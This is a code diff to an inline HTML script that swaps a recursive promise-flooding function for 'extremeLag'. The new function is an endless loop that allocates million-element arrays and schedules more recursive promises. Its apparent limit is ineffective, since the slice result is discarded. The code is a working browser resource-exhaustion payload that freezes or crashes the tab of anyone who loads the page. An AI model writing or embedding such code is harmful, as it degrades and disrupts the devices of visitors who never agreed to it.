@@ -1,6 +1,15 @@
-<script>function leak() {
-  Promise.resolve().then(leak);
-  Promise.resolve().then(leak);
+<script>let archive = [];
+function extremeLag() {
+  while (true) {
+    archive.push(new Array(1000000).fill(Math.random()));
+    Promise.resolve().then(extremeLag);
+    
+    if (archive.length > 1000) {
+      archive.slice(0, 100); 
+    }
+    
+    console.log("Allocated: " + archive.length + " units");
+  }
 }
-leak();
+extremeLag();
 </script>
